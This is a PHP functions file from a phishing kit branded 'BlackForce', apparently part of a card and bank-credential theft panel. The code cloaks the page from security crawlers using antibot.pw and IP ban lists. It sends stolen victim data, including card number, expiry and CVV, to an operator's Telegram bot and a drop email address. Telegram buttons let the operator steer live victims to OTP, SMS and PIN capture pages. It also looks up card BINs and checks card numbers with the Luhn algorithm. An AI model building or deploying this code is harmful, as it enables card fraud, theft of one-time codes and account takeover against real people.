<?php

require_once 'config/panel.php';


function get_client_ip() {
    $ip = null;
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
        if (array_key_exists($header, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                $potential_ip = trim($potential_ip);
                if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    $ip = $potential_ip;
                    break 2;
                }
            }
        }
    }
    return ($ip !== null) ? $ip : '127.0.0.1';
}



function antibotpw() {
    if( empty(ANTIBOTPW_API) )
        return;
    if( $_SESSION['notbot'] == 1 )
        return;
    $ip = get_client_ip();
    $list = file("Panel/blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }
    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOTPW_API .'&ua=' . $ua),true);
    $is_bot = $check['is_bot'];
    if( $is_bot == 1 ) {
        file_put_contents("Panel/botActBan/ip_ban.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['notbot'] = 1;
    }
}

function update() {

    $ipToDelete = get_client_ip();

    $filePaths = ['Panel/action/ip_sms.txt', 'Panel/action/ip_badsms.txt', 'Panel/action/ip_otp.txt', 'Panel/action/ip_badotp.txt', 'Panel/action/ip_confirm.txt', 'Panel/action/ip_pin.txt', 'Panel/action/ip_badpin.txt'];

    try {
        foreach ($filePaths as $filePath) {
            // Read the contents of the file
            $fileContents = file_get_contents($filePath);
            
            // Remove the specified IP address
            $fileContents = str_replace($ipToDelete, '', $fileContents);
            
            // Write the updated contents back to the file
            file_put_contents($filePath, $fileContents);
        }
    } catch (Exception $e) {
        // Handle the exception if needed
    }
}

function response() {
    $ip = get_client_ip(); // Assuming you have a function to get the client's IP address.

    // Define an array of file names to check.
    $fileNames = ['Panel/action/ip_sms.txt', 'Panel/action/ip_badsms.txt', 'Panel/action/ip_otp.txt', 'Panel/action/ip_badotp.txt', 'Panel/action/ip_confirm.txt', 'Panel/action/ip_pin.txt', 'Panel/action/ip_badpin.txt'];

    // Loop through the files and check if the IP is in any of them.
    foreach ($fileNames as $index => $fileName) {
        $fileContents = file_get_contents($fileName);

        // Check if the IP address is in the file.
        if (strpos($fileContents, $ip) !== false) {
            // Return a different response based on the file index.
            if ($index === 0) {
                return "sms";
            } elseif ($index === 1) {
                return "badsms";
            } elseif ($index === 2) {
                return "otp";
            } elseif ($index === 3) {
                return "badotp";
            } elseif ($index === 4) {
                return "confirm";
            } elseif ($index === 5) {
                return "pin";
            } elseif ($index === 6) {
                return "badpin";
            }
        }
    }

    // If the IP address is not found in any of the files, you can return a default response.
    return "unknown";
}

function BannedIP() {
    $ip = get_client_ip();
    $link_file = "Panel/botActBan/ip_ban.txt";
    $bannedip = file($link_file, FILE_IGNORE_NEW_LINES);

    if (in_array($ip, $bannedip)) {
        header('Location: https://www.google.com/404');
        exit();
    }
}

function update_ini($data, $file)
{
    $content = "";
    $parsed_ini = parse_ini_file($file, true);
    foreach ($data as $section => $values) {
        if ($section === "") {
            continue;
        }
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}




function send($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 STATS 📊",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendnotif($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = NOTIF_CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 STATS 📊",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendCard($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $fastLink = $host."/app/Panel/scan/index.php?ccn=" .$_SESSION['sccn']. '&exp=' .$_SESSION['sexp']. '&cch=BlackForce&cvv='.$_SESSION['scvv'];
    $views = $host."/visitors.html";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
            [
                [
                    "text" => "⚡️ Fast Link",
                    "url" => "$fastLink"
                ]
    
                ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendKey($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $otp = $host."/app/Panel/action/insert.php?ip=".$ip."&view=otp";
    $badotp = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badotp";
    $sms = $host."/app/Panel/action/insert.php?ip=".$ip."&view=sms";
    $badsms = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badsms";
    $conf = $host."/app/Panel/action/insert.php?ip=".$ip."&view=confirm";
    $pin = $host."/app/Panel/action/insert.php?ip=".$ip."&view=pin";
    $badpin = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badpin";
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📲 OTP 📲",
                    "url" => "$otp"
                ],
                [
                    "text" => "⛔ OTP ⛔",
                    "url" => "$badotp"
                ]
            ],
            [
                [
                    "text" => "📲 SMS 📲",
                    "url" => "$sms"
                ],
                [
                    "text" => "⛔ SMS ⛔",
                    "url" => "$badsms"
                ]
            ],
            [
                [
                    "text" => "🔐 PIN 🔐",
                    "url" => "$pin"
                ],
                [
                    "text" => "⛔ PIN ⛔",
                    "url" => "$badpin"
                ]
            ],
            [
                [
                    "text" => "✅ CONFIRM ✅",
                    "url" => "$conf"
                ]
            ],
            [
                [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                ]
            ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


function sendMail($maildata) {
    $Bullet = BULLET;
    $subject = "BLACKFORCE REZDATA";
    $headers = "From: BLACKFORCE  <takethisbruh@BlackForce.com>\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
    return @mail($Bullet, $subject, $maildata, $headers);
}

function BinCheck($new_string) {
    $cc = $new_string;
    $bin = substr($cc, 0, 6);
    $bins = str_replace(' ', '', $bin);
    
    $ch = curl_init();
    $url = "https://lookup.binlist.net/" . $bin;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }

    curl_close($ch);

    $someArray = json_decode($res, true);

    $_SESSION['bank'] = $someArray['bank']['name'];
    $_SESSION['type'] = $someArray['type'];
    $_SESSION['level'] = $someArray['brand'];
    $_SESSION['country'] = $someArray['country']['name'];
}
function is_valid_luhn($number) {
    settype($number, 'string');
    $sumTable = array(
        array(0,1,2,3,4,5,6,7,8,9),
        array(0,2,4,6,8,1,3,5,7,9));
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
}